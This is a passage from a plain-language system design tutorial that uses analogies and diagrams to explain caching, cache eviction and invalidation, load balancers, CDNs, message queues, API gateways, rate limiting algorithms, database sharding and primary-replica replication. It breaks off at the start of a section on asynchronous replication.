| **Analogy**  | A super strict accountant who checks every number twice | A fast cashier who sometimes needs to reconcile the till at end of day |
| **Use for**  | Money, reservations, medical data                       | Likes, views, caches, feeds                                            |

---

## 7. Caching â€” stop asking the same question twice

### The basic idea

Every time a user loads your app's homepage, you might be running 10 database queries to build that page. If 100,000 people load the homepage per minute, that's 1,000,000 database queries per minute â€” for the same data.

The cache says: _"I already fetched this. Here's my saved copy. No need to bother the database."_

```
WITHOUT CACHE:                           WITH CACHE:

Request 1: user asks for homepage        Request 1: cache miss â†’ go to DB â†’ cache result
           â†’ query DB (50ms)             Request 2: cache hit â†’ return from memory (1ms)
Request 2: user asks for homepage        Request 3: cache hit â†’ return from memory (1ms)
           â†’ query DB (50ms)             ...
Request 3: user asks for homepage        Request 100K: cache hit â†’ return from memory (1ms)
           â†’ query DB (50ms)
...

After 100K requests:                     After 100K requests:
100,000 DB queries                       1 DB query, 99,999 cache hits
```

---

### The cache hit / miss lifecycle

```mermaid
flowchart TD
    R["Request comes in:\n'Get profile for user 42'"]
    CHK{"Check\nCache"}
    HIT["âœ… Cache HIT\nReturn cached data\n~1ms"]
    MISS["âŒ Cache MISS\nNot in cache"]
    DB["Query Database\n~50ms"]
    STORE["Store result in cache\nwith expiry time TTL"]
    RET["Return result to user"]

    R --> CHK
    CHK -->|"found it"| HIT
    CHK -->|"not found"| MISS
    HIT --> RET
    MISS --> DB
    DB --> STORE
    STORE --> RET
```

---

### Cache eviction â€” what to throw out when the cache is full

Your cache has limited space (it's RAM). When it fills up, something has to go. These are the strategies:

```
LRU â€” Least Recently Used (most common)
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Evict whatever was LAST ACCESSED the longest time ago.

Cache slots (newest to oldest):
[User:99] [User:42] [User:17] [User:05] â† evict this one next
   â”‚          â”‚         â”‚         â”‚
 2s ago    10s ago   45s ago   3min ago

Analogy: Your desk. You throw out the paper you haven't looked at longest.

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

LFU â€” Least Frequently Used
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Evict whatever has been accessed the FEWEST total times.

Cache slots with access counts:
[User:42 (980x)] [User:99 (245x)] [User:17 (12x)] [User:05 (3x)] â† evict
    popular          moderate           rare           barely used

Good for: trending content where popular things stay popular

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

TTL â€” Time To Live (simplest)
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Every cached item has an expiry timestamp. After that, it's gone.

SET user:42 "..." EX 300   â† expires in 300 seconds (5 minutes)

Analogy: Milk with an expiry date. After that date, throw it out.
Good for: Any data that changes on a predictable schedule.
```

---

### Cache invalidation â€” the hardest problem

> _"There are only two hard things in Computer Science: cache invalidation and naming things."_ â€” Phil Karlton

You cached Alice's profile. Alice then updates her profile picture. Now the cache has the old picture and the database has the new one. They're out of sync. How do you fix this?

```
Strategy 1: Write-Through
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
When you update DB, also update the cache immediately.

App â†’ Write to DB â”€â”
                   â”œâ”€â”€â–º Cache is always fresh âœ…
App â†’ Write to Cache â”€â”˜

Problem: Every write is 2 operations. Slightly slower writes.
Best for: Systems where reads >> writes and freshness matters.

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

Strategy 2: Cache-Aside (most common in practice)
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
The app manages the cache manually.
On read: check cache â†’ if miss, read DB â†’ store in cache
On write: write to DB â†’ DELETE the cache entry (invalidate it)
         Next read will be a miss and refetch from DB.

Good for: Flexibility. Works well in practice.
Problem: There's a tiny window where DB has new data but someone
         reads the (not yet deleted) old cache entry.

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

Strategy 3: Write-Back (Write-Behind)
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Write to cache immediately. DB gets updated later (async).
Ultra-fast writes. But risky â€” if cache server dies before
DB is updated, you lose data.

Best for: Non-critical high-frequency writes (like view counters).
```

---

### Where caches live in a real system

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    Caching at every layer                            â”‚
â”‚                                                                      â”‚
â”‚  Browser Cache    â†’ Stores HTML, CSS, JS, images on user's device   â”‚
â”‚       â”‚              No server request needed at all                 â”‚
â”‚       â”‚                                                              â”‚
â”‚  CDN Cache        â†’ Stores static files at edge locations           â”‚
â”‚       â”‚              Closest server to user responds                 â”‚
â”‚       â”‚                                                              â”‚
â”‚  App Server Cache â†’ Process-level in-memory cache (simple maps)     â”‚
â”‚       â”‚              Fastest but lost when server restarts           â”‚
â”‚       â”‚                                                              â”‚
â”‚  Distributed Cache â†’ Redis / Memcached shared across all servers    â”‚
â”‚       â”‚              The most common production setup                â”‚
â”‚       â”‚              Survives server restarts                        â”‚
â”‚       â”‚                                                              â”‚
â”‚  DB Query Cache   â†’ Database stores results of recent queries        â”‚
â”‚                      Automatically invalidated on data change        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 8. Load Balancers â€” the traffic cops

### Why you need one

Imagine a highway suddenly getting 10x the traffic it was designed for. Without any management, every lane piles up and nothing moves. A traffic management system opens new lanes and routes cars intelligently.

A load balancer is exactly that for your servers.

```
WITHOUT LOAD BALANCER:              WITH LOAD BALANCER:

  1000 requests/sec                   1000 requests/sec
         â”‚                                    â”‚
         â–¼                            â”Œâ”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚    Load Balancer     â”‚
  â”‚  Server A   â”‚ â† getting hammered  â”‚  "Server A has 320   â”‚
  â”‚  CPU: 99%   â”‚                     â”‚   requests. Send     â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚   next one to B."    â”‚
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â””â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”˜
  â”‚  Server B   â”‚ â† sitting idle          â”‚      â”‚      â”‚
  â”‚  CPU: 1%    â”‚                         â–¼      â–¼      â–¼
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    Server A  Server B  Server C
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    CPU:33%   CPU:33%   CPU:33%
  â”‚  Server C   â”‚ â† sitting idle
  â”‚  CPU: 1%    â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

### How a load balancer decides where to send traffic

```mermaid
flowchart TD
    T["Incoming Request"]
    ALG{"Which algorithm\nis configured?"}

    T --> ALG

    ALG -->|"Round Robin"| RR["Send to next server\nin a circular list\n1â†’2â†’3â†’1â†’2â†’3...\n\nBest for: similar servers,\nsimilar request times"]

    ALG -->|"Weighted\nRound Robin"| WRR["Server A (powerful): 60%\nServer B (normal):  30%\nServer C (small):   10%\n\nBest for: mixed hardware"]

    ALG -->|"Least\nConnections"| LC["Check which server has\nfewest active connections\nright now. Send there.\n\nBest for: long-running\nwebsocket connections"]

    ALG -->|"IP Hash"| IPH["Hash the user's IP address\nSame user â†’ always same server\n\nBest for: when server needs\nto remember session state"]

    ALG -->|"Random"| RAND["Pick a random server\n\nSurprisingly effective.\nGood for: simple cases"]
```

---

### Health checks â€” how the load balancer knows a server is dead

Every few seconds, the load balancer pings each server: _"Are you alive?"_

```
Every 5 seconds:
Load Balancer â†’ "GET /health" â†’ Server A â†’ "200 OK" âœ… Keep in rotation
Load Balancer â†’ "GET /health" â†’ Server B â†’ "200 OK" âœ… Keep in rotation
Load Balancer â†’ "GET /health" â†’ Server C â†’ â³ No response after 3s âŒ

Load Balancer: "Server C looks dead. Stop sending it traffic."

All traffic now split between A and B.
Someone alerts the on-call engineer about Server C.
```

When Server C recovers, it gets added back automatically.

---

### Layer 4 vs Layer 7 Load Balancers

There are two types, and understanding the difference matters:

```
Layer 4 â€” Network Load Balancer:
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Operates at TCP/UDP level.
Routes packets based only on: IP address and port number.
Does NOT look inside the request at all.

Like a post office that routes packages by city/zip code only.
Very fast. Can't make smart decisions about content.

Layer 7 â€” Application Load Balancer:
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Operates at HTTP level.
Can look INSIDE the request: URL, headers, cookies, body.
Can make smart routing decisions:

  /api/*       â†’ route to API servers
  /images/*    â†’ route to image servers
  /websocket   â†’ route to websocket servers
  Cookie: beta_user=true â†’ route to staging servers

Like a smart receptionist who reads the letter and sends it to
the right department.
Slower than L4, but much smarter.
```

---

## 9. CDN â€” the world is big, servers are slow

### The speed of light problem

No matter how fast your servers are, there's a physical limit â€” light (and therefore data) travels at about 200,000 km/second through fibre optic cable.

```
Your server is in London.
A user in Sydney wants your homepage image (1MB).

Distance London â†’ Sydney: ~16,800 km
Round trip: ~33,600 km
At speed of light in fibre: 33,600 / 200,000 = 0.168 seconds

Just the physical travel time = 168 milliseconds.
Before your server even processes anything.

With a CDN server IN Sydney:
Distance Sydney â†’ Sydney CDN: ~5 km
Round trip: ~10 km
Travel time: 0.05ms

168ms â†’ 0.05ms. That's 3,360x faster just from proximity.
```

---

### How a CDN works

```mermaid
sequenceDiagram
    participant U as ðŸ‘¤ User in Tokyo
    participant CDN as ðŸ“¦ CDN Edge Server (Tokyo)
    participant O as ðŸ¢ Origin Server (New York)

    Note over U,O: First time anyone in Tokyo requests this image
    U->>CDN: "Give me /images/logo.png"
    CDN->>O: "I don't have it yet. Origin, send it to me."
    O-->>CDN: "Here's logo.png" (sent once, 200ms)
    CDN->>CDN: Store logo.png locally
    CDN-->>U: "Here's logo.png" (served from Tokyo, fast!)

    Note over U,O: Every subsequent request from anywhere in Tokyo
    U->>CDN: "Give me /images/logo.png"
    CDN-->>U: "Here it is!" (from local storage, ~5ms)

    Note over U,O: Origin never gets hit again until CDN cache expires
```

---

### Push CDN vs Pull CDN

```
PULL CDN (most common):
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
CDN fetches content from your origin ON DEMAND when first requested.
You don't have to do anything special.
CDN "pulls" content lazily as users request it.

Workflow: User requests â†’ CDN checks storage â†’ miss â†’ CDN fetches
          from origin â†’ CDN stores it â†’ CDN serves user.

Best for: Websites where you can't predict which content gets popular.

PUSH CDN:
â”â”â”â”â”â”â”â”â”
YOU proactively upload content to the CDN before users ask for it.
CDN always has it ready. Zero origin requests.

Workflow: You deploy new content â†’ you push it to CDN via API â†’
          CDN distributes to all edge locations â†’ users hit CDN directly.

Best for: Scheduled video releases (Netflix new episodes), software
          updates â€” you know exactly when it goes live.
```

---

## 10. Message Queues â€” don't do things right now

### The real problem they solve

Without queues, your system is **synchronous** â€” the user has to wait for EVERYTHING to finish before getting a response. Tasks are chained together.

```
User clicks "Place Order":
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. Save order to DB             50ms    â† user waiting
2. Check inventory              30ms    â† still waiting
3. Charge credit card          200ms    â† still waiting
4. Send confirmation email     150ms    â† still waiting
5. Update inventory count       30ms    â† still waiting
6. Notify warehouse              40ms   â† still waiting
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Total wait: 500ms of user staring at a spinner.

And if ANY step fails, the user sees an error.
```

With a queue, you only do the essential and fast parts synchronously. Everything else gets queued:

```
User clicks "Place Order":
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. Save order to DB             50ms    â† user waiting
2. Charge credit card          200ms    â† still waiting
3. Put these jobs on queue:      1ms    â† submit and forget
     â”Œâ”€ "send confirmation email"
     â”œâ”€ "update inventory"
     â””â”€ "notify warehouse"
4. Return "Order confirmed!" â† user is happy in 251ms
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

Meanwhile, workers process the queue jobs at their own pace:
Email worker:     sends email       (might take 2 seconds, user doesn't care)
Inventory worker: updates count     (might take 1 second)
Warehouse worker: notifies system   (might take 500ms)
```

---

### The queue in detail

```mermaid
graph LR
    subgraph Producers
        P1["ðŸ“± Web Server"]
        P2["ðŸ“± Mobile API"]
        P3["ðŸ”„ Cron Job"]
    end

    subgraph Queue
        Q["ðŸ“¬ Message Queue\n\nJob 1: send-email\nJob 2: resize-image\nJob 3: send-email\nJob 4: update-feed\nJob 5: send-push\n..."]
    end

    subgraph Workers - Consumers
        W1["âš™ï¸ Email Worker\n(takes email jobs)"]
        W2["âš™ï¸ Image Worker\n(takes image jobs)"]
        W3["âš™ï¸ Feed Worker\n(takes feed jobs)"]
    end

    P1 -->|"publish job"| Q
    P2 -->|"publish job"| Q
    P3 -->|"publish job"| Q

    Q -->|"delivers job"| W1
    Q -->|"delivers job"| W2
    Q -->|"delivers job"| W3
```

**The magic is decoupling:** Producers don't know or care who processes their jobs. Workers don't know or care who created the jobs. Each side can scale independently. If emails slow down, add more email workers. If image processing is fast, remove image workers.

---

### What happens when a worker fails mid-job?

This is where queues are genuinely clever. Most queues use **acknowledgement (ACK)**:

```
1. Worker picks up "send email" job
2. Worker starts processing it
3. Server crashes mid-way â€” email never sent
4. Queue notices: "I gave this job 30 seconds ago and got no ACK.
   Putting it back in the queue."
5. Another worker picks it up and completes it âœ…

Without a queue:
  Job was being processed in memory â†’ server crashes â†’ job gone forever
  User never gets their email. No retry. Silent failure.
```

---

### Dead Letter Queue (DLQ) â€” where jobs go to die

Some jobs fail repeatedly no matter how many times you retry. Maybe the email address is invalid. Maybe the data is malformed. After N retries, they go to the DLQ.

```
Job fails â†’ retry â†’ fail â†’ retry â†’ fail â†’ retry â†’ fail
After 3 retries: â†’ Dead Letter Queue

Operations team can inspect DLQ:
  "Why are these 47 jobs failing?"
  "Ah, the email service API changed format. Let's fix it and replay."
```

---

### Kafka vs RabbitMQ vs SQS

|                  | Kafka                                                                                                 | RabbitMQ                                                            | AWS SQS                             |
| ---------------- | ----------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ----------------------------------- |
| **Mental model** | Append-only log. Messages are retained for days/weeks. Multiple consumers can read the same messages. | Traditional queue. Message is deleted once a consumer processes it. | Managed queue. Fully hosted by AWS. |
| **Speed**        | Millions of msg/sec                                                                                   | Hundreds of thousands/sec                                           | Moderate, but managed               |
| **Replay**       | âœ… Yes â€” rewind to any point                                                                          | âŒ No â€” gone once consumed                                          | âŒ No (standard queue)              |
| **Use for**      | Event streaming, audit logs, activity feeds                                                           | Task queues, async jobs                                             | AWS-native async processing         |
| **Analogy**      | A newspaper archive â€” every edition ever printed, you can go back and re-read any of them             | A sticky note â€” once acted on, you throw it away                    | A managed sticky note service       |

---

## 11. API Gateway â€” the front door

### Why you need one

Imagine a hospital. Every department â€” cardiology, neurology, pharmacy, radiology â€” is a separate service. Patients don't walk directly into each department. They go to **reception** first. Reception checks who they are, decides where to send them, and logs the visit.

The API Gateway is reception.

```
WITHOUT GATEWAY:                    WITH GATEWAY:

Mobile App â†’ user-service:3001      Mobile App â”€â”€â–º API Gateway
Mobile App â†’ order-service:3002                        â”‚
Mobile App â†’ payment-service:3003      Checks:         â”œâ”€â”€â–º user-service
Mobile App â†’ search-service:3004       - Auth?          â”œâ”€â”€â–º order-service
                                       - Rate limit?     â”œâ”€â”€â–º payment-service
Browser â†’ user-service:3001            - Which service? â”œâ”€â”€â–º search-service
Browser â†’ order-service:3002           - Log the call   â””â”€â”€â–º ...
...

App needs to know every service's address.    App only knows one address.
Every service implements auth independently.  Auth is centralised.
Every service implements rate limiting.       Rate limiting is centralised.
```

---

### What the API Gateway does step by step

```mermaid
flowchart TD
    REQ["Incoming Request\nPOST /orders\nAuthorization: Bearer xyz123"]

    REQ --> AUTH{"1. Authenticate\nIs this token valid?"}
    AUTH -->|"invalid token"| ERR1["401 Unauthorized"]
    AUTH -->|"valid token"| RATE{"2. Rate Limit Check\nHas this user exceeded\ntheir request quota?"}
    RATE -->|"quota exceeded"| ERR2["429 Too Many Requests"]
    RATE -->|"within limits"| LOG["3. Log the request\n(timestamp, user, endpoint)"]
    LOG --> SSL["4. SSL Termination\nDecrypt HTTPS here.\nForward as HTTP internally."]
    SSL --> ROUTE{"5. Route to service\nWhich service handles\nPOST /orders?"}
    ROUTE --> SVC["Order Service"]
    SVC --> RESP["Response from service"]
    RESP --> TRANS["6. Transform if needed\n(change format, headers)"]
    TRANS --> USER["Return to Client"]
```

---

## 12. Rate Limiting â€” slowing down the greedy

### Why it matters

Without rate limiting, consider:

- A competitor scrapes your entire product database overnight
- A bot tries 10 million password combinations on your login endpoint
- A misbehaving client has an infinite loop hitting your API
- A DDoS attack floods you with traffic

Rate limiting prevents all of these.

---

### The Token Bucket â€” how it actually works

This is the most intuitive algorithm and the most widely used.

```
Imagine a bucket that:
  - Has a maximum capacity of 100 tokens
  - Fills up at a rate of 10 tokens per second
  - Each API request uses 1 token
  - If the bucket is empty, the request is rejected (429 error)

Timeline:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Second 0:  Bucket = 100 tokens (full)                            â”‚
â”‚ Second 1:  5 requests come in  â†’ Bucket = 100 - 5 + 10 = 105... â”‚
â”‚            ... capped at 100   â†’ Bucket = 100                    â”‚
â”‚ Second 2:  80 requests (burst) â†’ Bucket = 100 - 80 + 10 = 30    â”‚
â”‚ Second 3:  80 requests again   â†’ Bucket = 30 - 80 + 10 = -40    â”‚
â”‚            Bucket can't go negative. 40 requests get 429 âŒ      â”‚
â”‚            10 go through âœ…                                       â”‚
â”‚ Second 4:  Bucket refills: 10 new tokens. Bucket = 20            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Benefit of Token Bucket: allows SHORT bursts (up to bucket capacity)
but sustains the long-term average rate.
A legitimate user who does a sudden burst of activity isn't blocked
immediately â€” they use their saved-up tokens.
```

---

### The algorithms compared

```
Fixed Window:
â”â”â”â”â”â”â”â”â”â”â”â”
Allow 100 requests per minute.
Window resets every 60 seconds.

|---60s window---|---60s window---|
0              60              120

Problem: User sends 100 at second 59, then 100 at second 61.
That's 200 in 2 seconds. Both windows say "fine!" âŒ

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

Sliding Window:
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Look back exactly 60 seconds from RIGHT NOW, not from a fixed reset.

At second 61, user wants request 101:
  Count requests from second 1 to 61: all 100 from window 1 gone âœ…
  Correctly handled.

More accurate but needs more memory.

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

Leaky Bucket:
â”â”â”â”â”â”â”â”â”â”â”â”â”
Requests go IN at any rate.
Requests come OUT at a fixed, constant rate.

Like a bucket with a small hole in the bottom.
Water (requests) pours in fast. Drains at steady pace.
If you pour too fast, water overflows (requests dropped).

Guarantees a perfectly smooth output rate.
Bad for bursty-but-legitimate traffic.
```

---

## 13. Database Sharding â€” cutting the data pie

### When do you even need this?

Most apps never need sharding. You need it only when your data grows so large that a single database machine can't hold it or query it fast enough.

Signs you might need sharding:

- Your database table has billions of rows and queries take seconds
- A single DB server runs out of disk space
- Write throughput exceeds what one machine can handle (~many thousands/sec)

---

### What sharding actually is

You split your data across multiple database machines called **shards**. Each shard holds a subset of the total data.

```
WITHOUT SHARDING:                    WITH SHARDING:

One database                         Shard 1       Shard 2       Shard 3
storing all                          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
1 billion users:                     â”‚Users    â”‚   â”‚Users    â”‚   â”‚Users    â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                      â”‚ID 1-333Mâ”‚   â”‚ID 333M- â”‚   â”‚ID 666M- â”‚
â”‚ ALL 1B rows â”‚                      â”‚         â”‚   â”‚666M     â”‚   â”‚1B       â”‚
â”‚ crushing    â”‚                      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚ one machine â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                      Each shard is a separate machine.
                                     Each holds ~333M rows.
```

---

### Shard key â€” the decision that haunts you

The shard key is the field you use to decide which shard a piece of data goes to. Choose wrong and you create "hot spots" â€” one shard getting way more traffic than others.

```mermaid
graph TD
    Query["Query for user_id = 7,382,194"]
    SK{"Shard Key:\nuser_id % 3"}

    Query --> SK

    SK -->|"7,382,194 % 3 = 1"| S1["ðŸ—„ï¸ Shard 1"]
    SK -->|"7,382,194 % 3 = 2"| S2["ðŸ—„ï¸ Shard 2"]
    SK -->|"7,382,194 % 3 = 0"| S3["ðŸ—„ï¸ Shard 3"]

    S1 --> FOUND["Found! Return user data"]
```

**Hot spot example â€” why shard key choice matters:**

```
BAD shard key: created_date (range-based: Jan-Apr â†’ Shard 1, etc.)

January:  10,000 users signing up â†’ all hit Shard 1
Feb-Apr:  10,000 more             â†’ all still hit Shard 1
May-Aug:  10,000 more             â†’ all hit Shard 2
Current month: ALL activity       â†’ all hit whichever shard is current

Result: Current shard is on fire. All others are idle.
This is called a HOT SPOT. âŒ

GOOD shard key: hash(user_id) % number_of_shards

Every user_id hashes to a pseudorandom shard.
Traffic is distributed evenly.
No hot spots. âœ…
```

---

### The dark side of sharding â€” why to avoid it until you must

```
Problem 1: Cross-shard queries
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
"Find all users who bought product X"
â†’ Has to query ALL shards and merge results
â†’ Slow, complex, expensive

Problem 2: Cross-shard transactions
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
User A (Shard 1) transfers money to User B (Shard 3)
â†’ Can't do an ACID transaction across shards
â†’ Need complex distributed transaction protocols (nightmare)

Problem 3: Resharding
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
You have 3 shards. You add a 4th.
Now hash(user_id) % 4 â‰  hash(user_id) % 3
â†’ ALL existing data is on the wrong shard
â†’ You have to migrate everything while the app is live
â†’ Engineering hell

Problem 4: Joins don't work
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
SQL JOIN between two tables that live on different shards = not possible
You have to do it in application logic.
```

> **The rule:** Don't shard. Scale vertically first. Add read replicas. Optimise your queries. Only shard as a last resort.

---

## 14. Replication â€” keeping backups alive

### Sharding vs Replication â€” what's the difference?

```
Sharding:      Split data across machines (each holds different data)
               Goal: Handle more data / more writes

Replication:   Copy SAME data across machines
               Goal: Handle more reads / survive failures
```

---

### How Primary-Replica replication works

```mermaid
graph LR
    APP["Application"]

    APP -->|"ALL writes go here"| P["ðŸ—„ï¸ Primary DB\n(Read + Write)"]
    P -->|"replicates changes"| R1["ðŸ—„ï¸ Replica 1\n(Read only)"]
    P -->|"replicates changes"| R2["ðŸ—„ï¸ Replica 2\n(Read only)"]
    P -->|"replicates changes"| R3["ðŸ—„ï¸ Replica 3\n(Read only)"]

    APP -->|"reads can go to any replica"| R1
    APP -->|"reads can go to any replica"| R2
    APP -->|"reads can go to any replica"| R3
```

Why separate reads and writes?
Most apps have far more reads than writes (e.g. 90% reads, 10% writes). Replicas handle all the reading, freeing up the primary to focus purely on writes. This is a massive performance win.

---

### Synchronous vs Asynchronous Replication

```
Synchronous Replication:
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
1. App writes to Primary
2. Primary writes to disk
3. Primary sends data to Replica
4. Replica writes to disk and confirms
5. Primary says "Done!" to App

     App â”€â”€â–º Primary â”€â”€â–º Replica â”€â”€â–º confirms
                  â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              Only responds after replica confirms

âœ… Zero data loss. Replica always up to date.
âŒ Every write takes longer (waiting for replica ACK).
âŒ If replica is slow or down, primary stalls.

Asynchronous Replication:
